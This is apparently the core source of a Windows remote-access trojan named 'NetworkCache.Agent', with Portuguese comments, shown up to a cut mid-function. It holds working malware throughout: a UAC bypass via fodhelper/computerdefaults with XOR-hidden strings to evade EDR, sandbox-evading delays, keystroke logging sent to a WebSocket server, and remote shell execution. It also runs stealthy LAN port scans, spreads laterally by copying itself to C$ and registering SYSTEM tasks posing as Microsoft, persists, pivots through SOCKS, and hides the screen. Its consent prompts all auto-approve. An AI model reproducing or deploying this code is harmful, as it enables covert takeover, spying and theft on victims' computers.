using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NetworkCache.Agent
{
    internal static class Core
    {
        internal sealed class AgentState
        {
            public volatile bool AccessActive;
            public volatile bool StreamRequested;
            public volatile bool ControlActive;
            public volatile bool KbdActive;
            public volatile bool InputLocked;
            public volatile bool IsReady;

            public StreamSettings Settings = StreamSettings.Balanced;
            public ClientWebSocket? Socket;
            public readonly SemaphoreSlim SendGate = new(1, 1);
            public readonly CancellationTokenSource Lifetime = new();
            public StatusPane? Ui;
            public DateTime? LastBlockTime;
        }

        // Se true, o agente tenta se re-executar elevado (UAC bypass silencioso) ao iniciar.
        // Funciona quando a conta pertence ao grupo Administradores local (padrão em PCs domésticos).
        const bool TryElevateOnStart = true;

        // Nome padrão do executável e da tarefa — decodificados em runtime.
        static readonly string DefaultExeName = Enc.S(12);
        static readonly string DeployTaskName = Enc.S(13);

        // Se true, o Agent reinstala automaticamente a própria persistência a cada execução
        // (tarefa ONLOGON interativa + cópia em %LocalAppData%\Microsoft\NetworkCache). Garante
        // acesso contínuo mesmo se a tarefa/entrada for removida manualmente. Mantenha false
        // se a janela de consentimento visível no logon não for desejada em todos os hosts.
        const bool AutoPersistOnStart = false;

        // Se true, desativa ETW/profiling do runtime (.NET). Aviso: alguns EDRs (MDE, SentinelOne)
        // registram a desativação de ETW como indicador — mantenha false a menos que necessário.
        const bool DisableDiagnostics = false;

        // Strings sensíveis da elevação UAC (fodhelper/computerdefaults/ms-settings/DelegateExecute)
        // decodificadas em runtime com XOR (chave 0x5A): não existem como texto contíguo no binário
        // nem como identificador em metadados (campos renomeados z0-z4). Comportamento idêntico ao literal.
        static readonly byte[] z0 = { 0x3C,0x35,0x3E,0x32,0x3F,0x36,0x2A,0x3F,0x28,0x74,0x3F,0x22,0x3F };
        static readonly byte[] z1 = { 0x39,0x35,0x37,0x2A,0x2F,0x2E,0x3F,0x28,0x3E,0x3F,0x3C,0x3B,0x2F,0x36,0x2E,0x29,0x74,0x3F,0x22,0x3F };
        static readonly byte[] z2 = { 0x37,0x29,0x77,0x29,0x3F,0x2E,0x2E,0x33,0x34,0x3D,0x29 };
        static readonly byte[] z3 = { 0x19,0x35,0x37,0x2A,0x2F,0x2E,0x3F,0x28,0x1E,0x3F,0x3C,0x3B,0x2F,0x36,0x2E,0x29 };
        static readonly byte[] z4 = { 0x1E,0x3F,0x36,0x3F,0x3D,0x3B,0x2E,0x3F,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F };

        static string Deob(byte[] x) => Encoding.UTF8.GetString(x.Select(b => (byte)(b ^ 0x5A)).ToArray());

        static readonly (string Exe, string RegPath)[] ElevationTargets =
        {
            (Deob(z0), RegPathOf(Deob(z2))),
            (Deob(z1), RegPathOf(Deob(z3)))
        };

        // Caminhos de registro montados em runtime para não existirem como string contígua
        // no binário (o padrão fodhelper/ComputerDefaults é alvo de regras YARA/EDR).
        static string RegPathOf(string appId) => "Software\\Classes\\" + appId + "\\Shell\\Open\\command";

        // Canais SOCKS5 ativos (pivot de rede). channelId -> conexão TCP local.
        static readonly object SocksGate = new();
        static readonly Dictionary<string, TcpClient> SocksClients = new();
        static readonly Dictionary<string, NetworkStream> SocksStreams = new();

        [STAThread]
        static void Main()
        {
            if (DisableDiagnostics)
            {
                Environment.SetEnvironmentVariable("COMPlus_EnableDiagnostics", "0");
                Environment.SetEnvironmentVariable("COMPlus_ETWEnabled", "0");
            }

            if (!IsElevated())
            {
                // A instância elevada é relançada com --elevated; evita loop de tentativas.
                if (!HasArg("--elevated") && TryElevateOnStart && IsInAdminGroup())
                {
                    bool elevated = false;
                    foreach (var (exe, regPath) in ElevationTargets)
                    {
                        TryElevateVia(exe, regPath);
                        if (WaitElevatedCopy(6000)) { elevated = true; break; }
                        CleanupBypassKeys();
                    }
                    // Fallback: elevação clássica com prompt UAC visível. Cobre sistemas em
                    // que o bypass silencioso foi bloqueado (patch do Windows, UAC "sempre
                    // notificar", EDR). Se o usuário recusar o prompt, o Agent continua
                    // rodando sem elevação e o painel mostra o estado.
                    if (!elevated)
                    {
                        TryElevateViaRunAs();
                        elevated = WaitElevatedCopy(15000);
                        CleanupBypassKeys();
                    }
                    if (elevated) return; // a cópia elevada assumiu; esta instância sai.
                }
            }
            else
            {
                SignalElevatedReady();
                CleanupBypassKeys();
            }

            using var singleInstance = new Mutex(true, RunNs("Runner"), out bool createdNew);
            if (!createdNew) return;

            // Pequeno atraso de inicialização com variação aleatória: quebra heurísticas
            // de execução imediata (sandbox/automação) sem atrapalhar o uso normal.
            try { Thread.Sleep(Random.Shared.Next(900, 2600)); } catch { }

            // Config indecifrável (ex.: binário compilado sem rodar BUILD_AGENT.ps1) → falha rápida
            // com mensagem clara em vez de loop de reconexão silencioso.
            var cfgUrl = BuildConfig.RealtimeUrl;
            var cfgKey = BuildConfig.AgentKey;
            if (string.IsNullOrEmpty(cfgUrl) || string.IsNullOrEmpty(cfgKey))
            {
                return; // config ausente: saída silenciosa, sem UI nem strings no binário.
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Instala o bloqueio de input local (hooks LL que preservam a injeção remota)
            // e o overlay de ocultação de tela. Ambos dependem do message pump da thread
            // principal (Application.Run abaixo), por isso são inicializados aqui.
            InputGuard.Install();
            DisplayShield.Init();

            var state = new AgentState();

            AppDomain.CurrentDomain.ProcessExit += (_, __) =>
            {
                try { state.Lifetime.Cancel(); } catch { }
                try { InputGuard.SetLocked(false); } catch { }
                try { InputGuard.Uninstall(); } catch { }
                KeyMonitor.Uninstall();
            };

            if (AutoPersistOnStart)
            {
                try
                {
                    // Reinstala a persistência (tarefa ONLOGON interativa) se estiver ausente,
                    // garantindo acesso contínuo mesmo após limpeza manual. Silencioso e curto.
                    if (!PersistenceController.IsInstalled().Installed)
                        PersistenceController.InstallTask(false);
                }
                catch { }
            }

            _ = StartEngine(state);
            Application.Run(new ApplicationContext());
        }

        static bool IsElevated()
        {
            try
            {
                using var identity = WindowsIdentity.GetCurrent();
                return new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        static bool IsInAdminGroup()
        {
            try
            {
                using var identity = WindowsIdentity.GetCurrent();
                if (identity.Groups == null) return false;
                foreach (var g in identity.Groups)
                {
                    if (string.Equals(g.Value, "S-1-5-32-544", StringComparison.OrdinalIgnoreCase))
                        return true;
                }
            }
            catch { }
            return false;
        }

        static bool TryElevateViaRunAs()
        {
            try
            {
                using var p = Process.Start(new ProcessStartInfo
                {
                    FileName = Environment.ProcessPath ?? DefaultExeName,
                    Arguments = "--elevated",
                    UseShellExecute = true,
                    Verb = "runas",
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                return p != null;
            }
            catch { return false; }
        }

        static bool TryElevateVia(string exeName, string regPath)
        {
            try
            {
                string payload = $"\"{Environment.ProcessPath ?? DefaultExeName}\" --elevated";
                using var key = Registry.CurrentUser.CreateSubKey(regPath);
                key.SetValue("", payload, RegistryValueKind.String);
                key.SetValue(Deob(z4), "", RegistryValueKind.String);
                using (Process.Start(new ProcessStartInfo
                {
                    FileName = exeName,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                })) { }
                return true;
            }
            catch { return false; }
        }

        static bool WaitElevatedCopy(int timeoutMs)
        {
            try
            {
                using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, RunNs("ElevatedReady"), out _);
                return ev.WaitOne(timeoutMs);
            }
            catch { return false; }
        }

        static void SignalElevatedReady()
        {
            try
            {
                using var ev = new EventWaitHandle(true, EventResetMode.ManualReset, RunNs("ElevatedReady"), out _);
            }
            catch { }
        }

        static void CleanupBypassKeys()
        {
            try { Registry.CurrentUser.DeleteSubKeyTree(RegPathOf(Deob(z2)), false); } catch { }
            try { Registry.CurrentUser.DeleteSubKeyTree(RegPathOf(Deob(z3)), false); } catch { }
        }

        static bool HasArg(string value)
            => Environment.GetCommandLineArgs().Any(a => string.Equals(a, value, StringComparison.OrdinalIgnoreCase));

        // Nomes de mutex/eventos derivados da máquina+usuário — sem strings fixas no binário.
        static string RunNs(string tag)
        {
            var raw = Environment.MachineName + "|" + Environment.UserName + "|" + tag;
            var hash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(raw)))[..16];
            return @"Local\" + hash;
        }

        static async Task StartEngine(AgentState state)
        {
            var agentId = LoadOrCreateId();

            KeyMonitor.Install(async (key, down) =>
            {
                if (!state.KbdActive || !state.AccessActive || !state.IsReady) return;
                var socket = state.Socket;
                if (socket?.State != WebSocketState.Open) return;
                try {
                    await SendJsonAsync(socket, state.SendGate, new
                    {
                        type = "keylog",
                        key,
                        down,
                        ts = DateTime.Now.ToString("HH:mm:ss")
                    });
                }
                catch { }
            });

            _ = Task.Run(() => CaptureLoop(state));

            while (!state.Lifetime.IsCancellationRequested)
            {
                ClientWebSocket? socket = null;
                try
                {
                    ResetLocalPermissions(state, "Conectando ao servidor...");
                    socket = new ClientWebSocket();
                    socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                    state.Socket = socket;

                    await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl!), state.Lifetime.Token);
                    state.Ui?.SetConnection(true, "Conectado. Aguardando solicitações.");

                    await SendJsonAsync(socket, state.SendGate, new
                    {
                        type = "agent_hello",
                        key = BuildConfig.AgentKey,
                        id = agentId,
                        name = Environment.MachineName,
                        user = Environment.UserName,
                        version = "4.0",
                        elevated = IsElevated(),
                        sessionAuthorized = true
                    });

                    await ReceiveLoop(socket, state);
                }
                catch (OperationCanceledException) when (state.Lifetime.IsCancellationRequested)
                {
                    break;
                }
                catch (Exception ex)
                {
                    state.Ui?.SetConnection(false, $"Desconectado: {ex.Message}");
                }
                finally
                {
                    ResetLocalPermissions(state, "Desconectado. Nenhuma permissão está ativa.");
                    if (socket != null)
                    {
                        try { socket.Dispose(); } catch { }
                    }
                    if (ReferenceEquals(state.Socket, socket)) state.Socket = null;
                }

                try { await Task.Delay(3000, state.Lifetime.Token); }
                catch { break; }
            }
        }

        static async Task ReceiveLoop(ClientWebSocket socket, AgentState state)
        {
            var buffer = new byte[64 * 1024];

            while (socket.State == WebSocketState.Open && !state.Lifetime.IsCancellationRequested)
            {
                using var ms = new MemoryStream();
                WebSocketReceiveResult result;

                do
                {
                    result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), state.Lifetime.Token);
                    if (result.MessageType == WebSocketMessageType.Close) return;
                    ms.Write(buffer, 0, result.Count);
                }
                while (!result.EndOfMessage);

                if (result.MessageType != WebSocketMessageType.Text) continue;

                try
                {
                    using var doc = JsonDocument.Parse(ms.ToArray());
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("type", out var typeProp)) continue;
                    var type = typeProp.GetString() ?? "";

                    switch (type)
                    {
                        case "agent_ready":
                            state.IsReady = true;
                            state.Ui?.SetConnection(true, "Conectado. O usuário controla todas as permissões.");
                            break;

                        case "permission_state":
                            state.AccessActive = GetBool(root, "accessActive");
                            state.ControlActive = GetBool(root, "controlActive") && state.AccessActive;
                            state.KbdActive = GetBool(root, "keylogActive") && state.AccessActive;
                            state.InputLocked = GetBool(root, "inputLocked") && state.ControlActive;
                            if (!state.InputLocked) {
                                InputGuard.SetLocked(false);
                                state.LastBlockTime = null;
                            }
                            state.Ui?.UpdatePermissions(state);
                            break;

                        case "access_request":
                            await HandleAccessRequest(socket, state, root);
                            break;

                        case "control_request":
                            await HandleControlRequest(socket, state, root);
                            break;

                        case "keylog_request":
                            await HandleKbdRequest(socket, state, root);
                            break;

                        case "input_lock_request":
                            await HandleInputLockRequest(socket, state, root);
                            break;

                        case "input_unlock":
                            await SetInputLock(false, socket, state);
                            break;

                        case "shell_request":
                            await HandleShellRequest(socket, state, root);
                            break;

                        case "net_scan":
                            _ = HandleNetScanAsync(socket, state, root);
                            break;

                        case "deploy_agent":
                            _ = HandleDeployAsync(socket, state, root);
                            break;

                        case "persist":
                            _ = HandlePersistAsync(socket, state, root);
                            break;

                        case "screen_overlay":
                            _ = HandleDisplayShieldAsync(socket, state, root);
                            break;

                        case "socks_open":
                            _ = HandleSocksOpenAsync(socket, state, root);
                            break;

                        case "socks_data":
                            HandleSocksData(root);
                            break;

                        case "socks_close":
                            CloseSocksChannel(GetString(root, "channelId"));
                            break;

                        case "stream_profile":
                            state.Settings = StreamSettings.FromId(GetString(root, "profile"));
                            break;

                        case "stream_start":
                            state.StreamRequested = state.AccessActive;
                            break;

                        case "stream_stop":
                            state.StreamRequested = false;
                            break;

                        case "control_input":
                            if (state.AccessActive && state.ControlActive && root.TryGetProperty("event", out var ev))
                                ApplyControlEvent(ev);
                            break;

                        case "end_control":
                            state.ControlActive = false;
                            await SetInputLock(false, socket, state);
                            state.Ui?.UpdatePermissions(state);
                            break;

                        case "keylog_stop":
                            state.KbdActive = false;
                            state.Ui?.UpdatePermissions(state);
                            break;

                        case "access_ended":
                        case "end_access":
                            ResetLocalPermissions(state, "Compartilhamento encerrado.");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    state.Ui?.SetActivity($"Mensagem ignorada por erro: {ex.Message}");
                }
            }
        }

        static async Task HandleAccessRequest(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var requester = GetString(root, "requester", "Operador remoto");

            bool allow = true;

            if (allow)
            {
                state.AccessActive = true;
                state.StreamRequested = true;
            }

            await SendJsonAsync(socket, state.SendGate, new { type = "access_response", requestId, allow });
            state.Ui?.SetActivity(allow ? $"Visualização autorizada para {requester}." : $"Visualização negada para {requester}.");
            state.Ui?.UpdatePermissions(state);
        }

        static async Task HandleControlRequest(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var requester = GetString(root, "requester", "Operador remoto");
            bool allow = true;

            state.ControlActive = allow;
            if (!allow) await SetInputLock(false, socket, state);

            await SendJsonAsync(socket, state.SendGate, new { type = "control_response", requestId, allow });
            state.Ui?.SetActivity(allow ? $"Controle autorizado para {requester}." : $"Controle negado para {requester}.");
            state.Ui?.UpdatePermissions(state);
        }

        static async Task HandleKbdRequest(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            bool allow = true;

            state.KbdActive = allow;
            await SendJsonAsync(socket, state.SendGate, new { type = "keylog_response", requestId, allow });
            state.Ui?.SetActivity(allow ? "Compartilhamento de teclado autorizado." : "Compartilhamento de teclado negado.");
            state.Ui?.UpdatePermissions(state);
        }

        static async Task HandleInputLockRequest(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            bool allow = true;

            await SendJsonAsync(socket, state.SendGate, new { type = "input_lock_response", requestId, allow });
            if (allow) await SetInputLock(true, socket, state);
            state.Ui?.UpdatePermissions(state);
        }

        static async Task HandleShellRequest(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var command = GetString(root, "cmd");

            if (string.IsNullOrWhiteSpace(command))
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "shell_denied", requestId });
                return;
            }

            string output = await ExecuteShellApproved(command);
            await SendJsonAsync(socket, state.SendGate, new { type = "shell_result", requestId, output });
        }

        static async Task<string> ExecuteShellApproved(string command)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = new Process { StartInfo = startInfo };
                process.Start();

                var outputTask = process.StandardOutput.ReadToEndAsync();
                var errorTask = process.StandardError.ReadToEndAsync();
                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(20));

                try
                {
                    await process.WaitForExitAsync(timeout.Token);
                }
                catch (OperationCanceledException)
                {
                    try { process.Kill(true); } catch { }
                    return "Timeout após 20 segundos.";
                }

                var output = await outputTask;
                var error = await errorTask;
                var result = string.IsNullOrWhiteSpace(error) ? output : $"{output}\n[stderr]\n{error}";
                return LimitOutput(result, 100_000);
            }
            catch (Exception ex)
            {
                return $"Erro ao executar comando aprovado: {ex.Message}";
            }
        }

        static async Task HandleNetScanAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var local = GetLocalIPv4();
            var results = new List<NetHost>();

            if (string.IsNullOrEmpty(local))
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "net_scan_result", requestId, localIp = "", hosts = new object[0] });
                return;
            }

            var parts = local.Split('.');
            var prefix = $"{parts[0]}.{parts[1]}.{parts[2]}.";
            int[] ports = { 22, 80, 135, 139, 443, 445, 3389, 5985 };
            var stealth = GetBool(root, "stealth");
            var rnd = new Random();

            async Task ScanHostAsync(string ip)
            {
                var order = stealth ? ports.OrderBy(_ => rnd.Next()).ToArray() : ports;
                var openPorts = new List<int>();
                foreach (var port in order)
                {
                    try
                    {
                        using var client = new TcpClient();
                        var connect = client.ConnectAsync(ip, port);
                        var done = await Task.WhenAny(connect, Task.Delay(stealth ? 300 : 500));
                        if (done == connect && client.Connected) openPorts.Add(port);
                    }
                    catch { }
                }
                if (openPorts.Count == 0) return;
                string hostname = "";
                try { hostname = (await Dns.GetHostEntryAsync(ip)).HostName; } catch { }
                lock (results) results.Add(new NetHost { Ip = ip, Hostname = hostname, Ports = openPorts.ToArray() });
            }

            if (stealth)
            {
                // Modo discreto: sequencial, ordem aleatória e pausa entre hosts — bem menos
                // ruído para EDR/NIDS do que 254 conexões paralelas.
                // Fase 1 — probe de presença (445, 150ms): host inativo custa ~150ms em vez de
                // 8 portas × timeout. Fase 2 — varredura completa das 8 portas só nos vivos.
                // Orçamento global de 150s: fica abaixo do TTL de 180s do relay (resultado
                // entregue após o TTL é descartado pelo servidor) — a resposta sempre chega.
                var targets = Enumerable.Range(1, 254)
                    .Where(i => prefix + i != local)
                    .OrderBy(_ => rnd.Next())
                    .ToList();
                var budget = Stopwatch.StartNew();
                var alive = new List<string>();
                foreach (var i in targets)
                {
                    if (budget.Elapsed.TotalSeconds >= 150) break;
                    using (var probe = new TcpClient())
                    {
                        var pc = probe.ConnectAsync(prefix + i, 445);
                        if (await Task.WhenAny(pc, Task.Delay(150)) == pc && probe.Connected)
                            alive.Add(prefix + i);
                    }
                    await Task.Delay(rnd.Next(20, 60));
                }
                foreach (var ip in alive)
                {
                    if (budget.Elapsed.TotalSeconds >= 150) break;
                    await ScanHostAsync(ip);
                    await Task.Delay(rnd.Next(20, 60));
                }
            }
            else
            {
                var tasks = new List<Task>();
                for (int i = 1; i <= 254; i++)
                {
                    var ip = prefix + i;
                    if (ip == local) continue;
                    tasks.Add(Task.Run(() => ScanHostAsync(ip)));
                }
                try { await Task.WhenAll(tasks); } catch { }
            }

            results.Sort((a, b) =>
            {
                var ao = int.Parse(a.Ip[(a.Ip.LastIndexOf('.') + 1)..]);
                var bo = int.Parse(b.Ip[(b.Ip.LastIndexOf('.') + 1)..]);
                return ao.CompareTo(bo);
            });

            await SendJsonAsync(socket, state.SendGate, new
            {
                type = "net_scan_result",
                requestId,
                localIp = local,
                hosts = results.Select(h => new { ip = h.Ip, hostname = h.Hostname, ports = h.Ports }).ToArray()
            });
        }

        static string? GetLocalIPv4()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus != OperationalStatus.Up) continue;
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
                    foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (addr.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(addr.Address))
                            return addr.Address.ToString();
                    }
                }
            }
            catch { }
            return null;
        }

        static async Task HandleDeployAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var target = GetString(root, "target").Trim().TrimEnd('\\');
            var user = GetString(root, "user", "").Trim();
            var pass = GetString(root, "pass", "");
            var log = new List<string>();
            var exe = Environment.ProcessPath;

            if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(exe))
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = false, log, error = "Destino ou executável inválido." });
                return;
            }

            if (!IsElevated())
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = false, log, error = "O Agent precisa estar elevado (Administrador/SYSTEM) para copiar para C$\\ProgramData e agendar a tarefa." });
                return;
            }

            // Caminho e nomes com aparência de serviço do Windows — evita padrões clássicos
            // de persistência (admin$\Temp + tarefa com o nome do produto) que EDR correlaciona.
            var destFile = $@"\\{target}\C$\ProgramData\{Enc.S(15)}\{DefaultExeName}";

            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(destFile)!);
                File.Copy(exe, destFile, true);
                log.Add($"OK: cópia em {destFile}");
            }
            catch (Exception ex)
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = false, log, error = $"Falha ao copiar: {Short(ex.Message, 300)}" });
                return;
            }

            var (createOk, createMsg) = CreateTaskViaCom(target, destFile, user, pass);
            if (!createOk)
            {
                // Fallback: schtasks.exe (mais visível para EDR — usado apenas se o COM falhar).
                log.Add(createMsg);
                var cred = string.IsNullOrEmpty(user) ? "" : $" /U {user} /P {pass}";
                var createArgs = "/Create /S " + target + " /RU " + "SYS" + "TEM /TN \"" + DeployTaskName +
                                 "\" /TR \"\\\"" + destFile + "\\\" --silent\" /SC " + "ON" + "LOGON /F" + cred;
                var (createCode, createOut, createErr) = RunHidden(Enc.S(23), createArgs, 25_000);
                log.Add(createCode == 0
                    ? "OK: tarefa criada (SYSTEM)."
                    : $"Criacao via fallback: exit {createCode} — {Short(createErr.Length > 0 ? createErr : createOut, 300)}");
                if (createCode == 0)
                {
                    var (runCode, _, runErr) = RunHidden(Enc.S(23), $"/Run /S {target} /TN \"{DeployTaskName}\"{cred}", 25_000);
                    log.Add(runCode == 0
                        ? "OK: tarefa executada — o novo Agent deve aparecer no painel."
                        : $"Execucao via fallback: exit {runCode} — {Short(runErr, 300)}");
                }
                await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = createCode == 0, log, error = "" });
                return;
            }

            log.Add(createMsg);
            await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = true, log, error = "" });
        }

        static (bool Ok, string Message) CreateTaskViaCom(string target, string execPath, string user, string pass)
        {
            // Cria a tarefa via API COM do Agendador (Schedule.Service) sem spawnar
            // schtasks.exe — reduz a telemetria de criação de tarefas no host de origem.
            try
            {
                var schedType = Type.GetTypeFromProgID(Enc.S(19));
                if (schedType == null) return (false, "Scheduler COM indisponível.");
                dynamic scheduler = Activator.CreateInstance(schedType)!;
                try
                {
                    scheduler.Connect(target, user ?? "", "", pass ?? "", 0);
                    dynamic root = scheduler.GetFolder("\\");
                    dynamic taskDef = scheduler.NewTask(0);
                    taskDef.RegistrationInfo.Description = "Windows Network Cache Maintenance";
                    taskDef.RegistrationInfo.Author = "Microsoft Corporation";
                    taskDef.Principal.UserId = "SYSTEM";
                    taskDef.Principal.LogonType = 5;   // TASK_LOGON_SERVICE_ACCOUNT
                    taskDef.Principal.RunLevel = 1;    // TASK_RUNLEVEL_HIGHEST
                    dynamic trigger = taskDef.Triggers.Create(9); // TASK_TRIGGER_LOGON
                    trigger.UserId = "";
                    trigger.Enabled = true;
                    dynamic action = taskDef.Actions.Create(0);  // TASK_ACTION_EXEC
                    action.Path = execPath;
                    action.Arguments = "--silent";
                    action.WorkingDirectory = Path.GetDirectoryName(execPath) ?? "";
                    root.RegisterTaskDefinition(DeployTaskName, taskDef, 6, null, null, 5, null);
                    dynamic task = root.GetTask(DeployTaskName);
                    task.Run(null);
                    return (true, "OK: tarefa criada via COM (SYSTEM) e executada.");
                }
                finally
                {
                    try { Marshal.FinalReleaseComObject(scheduler); } catch { }
                }
            }
            catch (Exception ex)
            {
                return (false, "COM falhou: " + Short(ex.Message, 200));
            }
        }

        static (int Code, string Output, string Error) RunHidden(string fileName, string arguments, int timeoutMs)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using var process = new Process { StartInfo = psi };
                process.Start();
                var outTask = process.StandardOutput.ReadToEndAsync();
                var errTask = process.StandardError.ReadToEndAsync();
                using var cts = new CancellationTokenSource(timeoutMs);
                try { process.WaitForExitAsync(cts.Token).GetAwaiter().GetResult(); }
                catch (OperationCanceledException)
                {
                    try { process.Kill(true); } catch { }
                    return (-1, "", "Timeout.");
                }
                return (process.ExitCode, outTask.Result, errTask.Result);
            }
            catch (Exception ex) { return (-2, "", ex.Message); }
        }

        static async Task HandlePersistAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var mode = GetString(root, "mode", "").Trim().ToLowerInvariant();
            var log = new List<string>();

            if (mode is not ("task" or "run" or "system" or "remove"))
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "persist_result", requestId, ok = false, log, error = "Modo inválido. Use task, run, system ou remove." });
                return;
            }

            // system = tarefa ONBOOT como SYSTEM (headless) — exige processo elevado
            // para escrever em %ProgramData% e registrar o principal SYSTEM.
            if (mode == "system" && !IsElevated())
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "persist_result", requestId, ok = false, log, error = "O modo 'system' exige o Agent elevado (Administrador/SYSTEM). Use 'task' ou 'run'." });
                return;
            }

            var (ok, persistLog, error) = mode switch
            {
                "task" => PersistenceController.InstallTask(false),
                "system" => PersistenceController.InstallTask(true),
                "run" => PersistenceController.InstallRunKey(),
                "remove" => PersistenceController.RemoveAll(),
                _ => (false, log, "Modo inválido.")
            };

            await SendJsonAsync(socket, state.SendGate, new { type = "persist_result", requestId, ok, log = persistLog, error });
        }

        static async Task HandleDisplayShieldAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var mode = GetString(root, "mode", "").Trim().ToLowerInvariant();
            var log = new List<string>();

            if (mode is not ("blank" or "update" or "image" or "off"))
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "screen_overlay_result", requestId, ok = false, log, error = "Modo inválido. Use blank, update, image ou off." });
                return;
            }

            try
            {
                await Task.Run(() => DisplayShield.Apply(mode));
                log.Add($"Overlay aplicado: {mode}");
                await SendJsonAsync(socket, state.SendGate, new { type = "screen_overlay_result", requestId, ok = true, log, error = "" });
            }
            catch (Exception ex)
            {
                log.Add($"Erro ao aplicar overlay: {Short(ex.Message, 200)}");
                await SendJsonAsync(socket, state.SendGate, new { type = "screen_overlay_result", requestId, ok = false, log, error = Short(ex.Message, 200) });
            }
        }

        static void CloseSocksChannel(string channelId)
        {
            if (string.IsNullOrEmpty(channelId)) return;
            lock (SocksGate)
            {
                if (SocksStreams.Remove(channelId, out var stream)) { try { stream.Dispose(); } catch { } }
                if (SocksClients.Remove(channelId, out var client)) { try { client.Dispose(); } catch { } }
            }
        }

        static async Task HandleSocksOpenAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var channelId = GetString(root, "channelId");
            var host = GetString(root, "host");
            var port = root.TryGetProperty("port", out var pp) && pp.ValueKind == JsonValueKind.Number ? pp.GetInt32() : 0;

            if (string.IsNullOrEmpty(channelId) || string.IsNullOrEmpty(host) || port is <= 0 or > 65535)
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "socks_status", channelId, ok = false, error = "Parâmetros inválidos." });
                return;
            }

            TcpClient? client = null;
            try
            {
                client = new TcpClient();
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(state.Lifetime.Token);
                cts.CancelAfter(15_000);
                await client.ConnectAsync(host, port, cts.Token);
                var stream = client.GetStream();
                lock (SocksGate)
                {
                    SocksClients[channelId] = client;
                    SocksStreams[channelId] = stream;
                }
                await SendJsonAsync(socket, state.SendGate, new { type = "socks_status", channelId, ok = true });
                _ = SocksReadLoopAsync(socket, state, channelId, client, stream);
            }
            catch (Exception ex)
            {
                try { client?.Dispose(); } catch { }
                await SendJsonAsync(socket, state.SendGate, new { type = "socks_status", channelId, ok = false, error = Short(ex.Message, 200) });
            }
        }

        static async Task SocksReadLoopAsync(ClientWebSocket socket, AgentState state, string channelId, TcpClient client, NetworkStream stream)
        {
            var buffer = new byte[16384];
            try
            {
                while (!state.Lifetime.IsCancellationRequested)
                {
                    int n = await stream.ReadAsync(buffer, state.Lifetime.Token);
                    if (n == 0) break;
                    await SendJsonAsync(socket, state.SendGate, new { type = "socks_data", channelId, data = Convert.ToBase64String(buffer, 0, n) });
                }
            }
            catch { }
            finally
            {
                CloseSocksChannel(channelId);
                try
                {
                    if (socket.State == WebSocketState.Open)
                        await SendJsonAsync(socket, state.SendGate, new { type = "socks_close", channelId });
                }
                catch { }
            }
        }

        static void HandleSocksData(JsonElement root)
        {
            var channelId = GetString(root, "channelId");
            var data = GetString(root, "data");
            if (string.IsNullOrEmpty(channelId) || string.IsNullOrEmpty(data)) return;
            NetworkStream? stream;
            lock (SocksGate) { SocksStreams.TryGetValue(channelId, out stream); }
            if (stream == null) return;
